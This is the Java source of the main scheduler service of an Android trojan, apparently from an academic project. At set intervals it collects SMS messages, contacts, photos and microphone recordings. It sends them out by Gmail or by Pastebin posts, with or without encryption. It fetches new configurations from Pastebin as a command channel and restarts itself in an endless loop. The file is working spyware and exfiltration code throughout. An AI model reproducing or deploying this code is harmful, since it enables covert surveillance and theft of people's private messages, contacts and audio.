package il.ac.colman.androidtrojan;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.Random;

import il.ac.colman.androidtrojan.Actions.ContactsAction;
import il.ac.colman.androidtrojan.Actions.ImagesAction;
import il.ac.colman.androidtrojan.Actions.RecorderAction;
import il.ac.colman.androidtrojan.Actions.SMSAction;
import il.ac.colman.androidtrojan.Channels.Mail.MailChannel;
import il.ac.colman.androidtrojan.Channels.Mail.MailSendTypes;
import il.ac.colman.androidtrojan.Channels.PasteBin.PasteBinChannel;
import il.ac.colman.androidtrojan.Channels.PasteBin.DataPooler;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class Scheduler extends Service {
	// ATAction instances
	private RecorderAction _recorder;
	private ContactsAction _contactsAction;
	private SMSAction _SMSAction;
	private ImagesAction _imageAction;

	// defines
	private static final String TAG = "MainTrojanService";
	private static final String _SMSMsg = "*SMS*";
	private static final String _contactsMsg = "*contacts*";
	private static final String _recorderMsg = "*recorder*";
	private static final String _imagesMsg = "*images*";
	private static final int LENGTH = 20;
	private static final String DESTINATION_FILE = Environment
			.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
			.getAbsolutePath()
			+ File.separator + "trojanExternalStorage.properties";

	// store the configuration from properties
	private static String _actions[];
	private static String _mailUserName;
	private static String _mailPassword;
	private static String _channelType[];
	private static int _record_length = 30000; // 1000MS = 1SEC
	private static int _collection_intervals = 60000*60*4;//60000-> 60 secs * 60 mins * 4 hours
	private static int _check_for_updates_intervals = 86400000;

	// get the hash values
	private static String _curr_hash_value = "b7d4aa1d77909b86b4087329d4ac8";
	private static String _next_hash_value = CreateRandomIdentifier(LENGTH);

	// chained data from the various actions
	private static StringBuilder _msg;

	// -------------------------------------------------properties parser------------------------------------------------
	// parse the properties file and init the local variables with the relative values
	private void parsePropertiesFile(Properties properties) {
		System.out.println("The properties are now loaded");
		System.out.println("properties: " + properties);
		_actions = properties.getProperty("actions").split(",");
		_record_length = Integer.parseInt(properties
				.getProperty("record_length"));
		_collection_intervals = Integer.parseInt(properties
				.getProperty("collection_intervals"));
		_check_for_updates_intervals = Integer.parseInt(properties
				.getProperty("check_for_updates_intervals"));
		_channelType = properties.getProperty("channel_type").split(",");
		_mailPassword = properties.getProperty("mail_password");
		_mailUserName = properties.getProperty("mail_user_name");

		// set different hash values just for the future configurations not the
		// first one
		if (!(properties.getProperty("current_hash_value")
				.contains(_curr_hash_value))) {
			_curr_hash_value = properties.getProperty("current_hash_value");
			_next_hash_value = properties.getProperty("next_hash_value");
		}
	}

	// parse the configuration file from the assets dir
	private void parseAssetPropertiesFile() {
		try {
			// copy the configuration file from the assets dir to the local
			// storage
			CopyFromAssetsToStorage(DESTINATION_FILE);
			LoadPropertiesFiles();

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// load the properties from the local configuration file
	private void LoadPropertiesFiles() throws IOException {
		InputStream iS = new FileInputStream(DESTINATION_FILE);
		Properties properties = new Properties();
		properties.load(iS);
		parsePropertiesFile(properties);
		Toast.makeText(this, properties.toString(), Toast.LENGTH_LONG).show();
		Log.d(TAG, "x");
	}

	// copy the configuration file from the assets dir to local storage
	private void CopyFromAssetsToStorage(String destinationFile)
			throws IOException {
		Resources resources = this.getResources();
		AssetManager assetManager = resources.getAssets();
		InputStream IS = assetManager.open("trojan.properties");
		//Toast.makeText(this, IS.toString(), Toast.LENGTH_LONG).show();
		//Log.d(TAG, "x");
		OutputStream OS = new FileOutputStream(destinationFile);
		//Toast.makeText(this, IS.toString(), Toast.LENGTH_LONG).show();
		//Log.d(TAG, "x");
		CopyStream(IS, OS);
		OS.flush();
		OS.close();
		IS.close();
	}

	// copy InputStream to OutputStream
	private void CopyStream(InputStream Input, OutputStream Output)
			throws IOException {
		byte[] buffer = new byte[5120];
		int length = Input.read(buffer);
		while (length > 0) {
			Output.write(buffer, 0, length);
			length = Input.read(buffer);
		}
	}

	// write the new configurations to local file
	private void writeToFile(String data, String destinationFile) {
		try {
			OutputStreamWriter outputStreamWriter = new OutputStreamWriter(
					openFileOutput(destinationFile, Context.MODE_PRIVATE));
			outputStreamWriter.write(data);
			outputStreamWriter.close();
		} catch (IOException e) {
			Log.e("Exception", "File write failed: " + e.toString());
		}
	}

	// write the new configuration that we have found to the internal storage and load it
	private void parsePastedPropertiesFile(String newConfigurations)
			throws IOException {
		writeToFile(newConfigurations, DESTINATION_FILE);
		LoadPropertiesFiles();
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	public void onDestroy() {
		Log.d(TAG, "onDestroy");
	}

	@Override
	public void onStart(Intent intent, int startid) {

		// start scheduler main function
		schedulerService();

		// just for being noticed that the service start:
		Toast.makeText(this, "Service started succefully", Toast.LENGTH_LONG).show();
		Log.d(TAG, "onStart finished, service started.");
	}

	public Properties load(String propertiesString) throws IOException {
		Properties properties = new Properties();
		properties.load(new StringReader(propertiesString));
		return properties;
	}

	// -------------------------------------------------scheduler main---------------------------------------------------------
	private void schedulerService() {
		// new configurations - if couldn't find the configurations by the next
		// hash value return -1
		String newConfigurations = "-1";
		//the string we are looking for when searching for new configuration on pastebin post
		String stringToSearch = "current_hash_value=" + _next_hash_value;

		try {
			newConfigurations = DataPooler.getData("'" + stringToSearch + "'");

		} catch (Exception ex) {
			System.out.println("couldn't get the requested configuration file"
					+ ex);
		}

		// found the requested configurations
		if (newConfigurations != "-1") {
			try {
				// load the configurations, convert it from string into
				// .properties format and update .properties
				parsePastedPropertiesFile(newConfigurations);
				Toast.makeText(this, "new configuration file found", Toast.LENGTH_LONG).show();
				Log.d(TAG, "new configuration file found");

			} catch (IOException ex) {
				System.out
				.println("new configurations found but couldn't find properties file"
						+ ex);
			}
		} else {
			// parse the .properties in asset file and update the local
			// variables
			parseAssetPropertiesFile();
			Toast.makeText(this, "old configuration file", Toast.LENGTH_LONG).show();
			Log.d(TAG, "old configuration file");
		}
		Toast.makeText(this, "Properties loaded", Toast.LENGTH_LONG).show();
		Log.d(TAG, "Properties loaded");

		
		// perform the actions by the intervals given in the .properties file
		// the below inline object takes the interval to check for new configurations and on each interval on collection perform onTick
		new CountDownTimer(
				_check_for_updates_intervals, _collection_intervals) {
			List<String> tmpArr = new ArrayList<String>();

			@Override
			public void onFinish() {
				//on finish of the counter time (default 24 hours), start the service again
				//by recursive operation. by that we get infinite loop operation:
				schedulerService();
			}

			@Override
			public void onTick(long millisUntilFinished) {
				//collecting the data:
				for (String action : _actions) {
					// main switch-case
					// available on JRE 1.7 and later versions
					if (action.equals("recorder")) {
						recordAction();
					} else if (action.equals("contacts")) {
						tmpArr.add(contactsAction());
					} else if (action.equals("SMS")) {
						tmpArr.add(SMSAction());
					} else if (action.equals("photos")) {
						tmpArr.add(imageAction());
					} else
						continue;
				}

				// chain all the data from the different actions
				String data = prepareMsg(tmpArr).toString();

				//send the data:
				sendData(data);
			}
		}.start();
	}

	// get all the strings from the actions and chain them
	private StringBuilder prepareMsg(List<String> actions) {
		_msg = new StringBuilder();
		for (String action : actions) {
			_msg.append(action + "\n\n\n\n");
		}
		return _msg;
	}

	// --------------------------------------------operate the actions--------------------------------------------------

	private String imageAction() {
		Toast.makeText(this, "photos action started", Toast.LENGTH_LONG).show();
		Log.d(TAG, "photos action started");

		_imageAction = new ImagesAction();

		Toast.makeText(this, "photos action finished", Toast.LENGTH_LONG)
		.show();
		Log.d(TAG, "photos action finished");
		return _imagesMsg + ":\n" + _imageAction.getData();

	}

	private String SMSAction() {
		Toast.makeText(this, "SMS action started", Toast.LENGTH_LONG).show();
		Log.d(TAG, "SMS action started");

		_SMSAction = new SMSAction(getBaseContext());

		Toast.makeText(this, "SMS action finished", Toast.LENGTH_LONG).show();
		Log.d(TAG, "SMSs had been loaded.");
		return _SMSMsg + ":\n" + _SMSAction.getData();
	}

	private String contactsAction() {
		Toast.makeText(this, "contacts action started", Toast.LENGTH_LONG)
		.show();
		Log.d(TAG, "contacts action started");

		_contactsAction = new ContactsAction(getBaseContext());

		Toast.makeText(this, "contacts action finished", Toast.LENGTH_LONG)
		.show();
		Log.d(TAG, "Contacts action finished.");
		return _contactsMsg + ":\n" + _contactsAction.getData();
	}

	private void recordAction() {
		Toast.makeText(this, "record action started", Toast.LENGTH_LONG).show();
		Log.d(TAG, "record action started");
		// start recording on service start

		// creating the recorder:
		_recorder = new RecorderAction(_record_length);

		// Before we stop recording, we will count 5 seconds(first arg
		// _record_length==5000, second arg is the intervals between each
		// iteration):
		CountDownTimer myTimer = new CountDownTimer(_record_length, 1000) {

			@Override
			public void onTick(long millisUntilFinished) {
			}

			@Override
			public void onFinish() {
				// keep collecting data until the recording is finished
				if (_recorder.is_finishedRecording()) {
					// send the data
					sendData(_recorderMsg + ":\n" + _recorder.getData());
				}
			}
		};
		// starting the timer:
		myTimer.start();
		Toast.makeText(this, "record action finished", Toast.LENGTH_LONG)
		.show();
		Log.d(TAG, "record action finished");
	}

	// send the data according to what specified on the properties file
	private void sendData(String data) {

		for (String channel : _channelType) {
			if (channel.equals("gmail")) {
				// send the data through the email
				sendMailUnencrypted(data);
			} else if (channel.equals("pastebin")) {
				// post the data on pastebin
				pastebinPostUnencrypted(data);

			} else if(channel.equals("pastebinEncrypted"))
			{
				//post the encrypted data on pastebin
				pastebinPostEncrypted(data);
			} else
				continue;
		}
	}

	// --------------------------------------------sending channels--------------------------------------------------------

	// send the data trough email (^ encrypted channel)
	private void sendMailUnencrypted(String data) {
		MailChannel mail = new MailChannel(MailSendTypes.String, _mailUserName,
				_mailPassword, null, null, data);
		mail.execute();
		Log.d(TAG, "SMS sended by mail.");
	}

	// post the data on pastebin wall (encrypted channel)
	private void pastebinPostUnencrypted(final String data) {
		Thread thread = new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					PasteBinChannel paste = new PasteBinChannel(
							getBaseContext());
					// send the data through pastebin
					paste.sendUnEncrypted(data, _curr_hash_value);
					String emailContent = "current hash value: "
							+ _curr_hash_value
							+ "\nnext hash value: "
							+ _next_hash_value
							+ "\n**for updating the configurations please use the 'next hash value'\n";
					MailChannel mail = new MailChannel(MailSendTypes.String,
							_mailUserName, _mailPassword, null, null,
							emailContent);
					mail.execute();
					Toast.makeText(getBaseContext(), "key sended",
							Toast.LENGTH_LONG).show();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});

		thread.start();
	}

	private void pastebinPostEncrypted(final String data) {
		Thread thread = new Thread(new Runnable(){
			@Override
			public void run() {
				try {
					PasteBinChannel paste = new PasteBinChannel(getBaseContext());
					String tmp;
					//send the data through pastebin
					tmp = paste.sendEncrypted(data, _curr_hash_value);
					//++++++++++++++++++++TMP FOR QA:++++++++++++++++++++
					MailChannel mail = new MailChannel(MailSendTypes.String,
							_mailUserName, _mailPassword,
							null, null, tmp);
					mail.execute();
					Toast.makeText(getBaseContext(), "key sended", Toast.LENGTH_LONG).show();
					//++++++++++++++++++++++++++++++++++++++++++++++++++++
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});

		thread.start();
	}

	// building random identifier
	private static String CreateRandomIdentifier(int index) {
		StringBuilder builder = new StringBuilder();
		char[] ch;
		Random rand = new Random();

		for (int j = 0; j < index; j++) {
			Double d = Math.floor(26 * rand.nextDouble() + 97);
			ch = Character.toChars(d.intValue());
			builder.append(ch[0]);
		}

		return builder.toString();
	}
}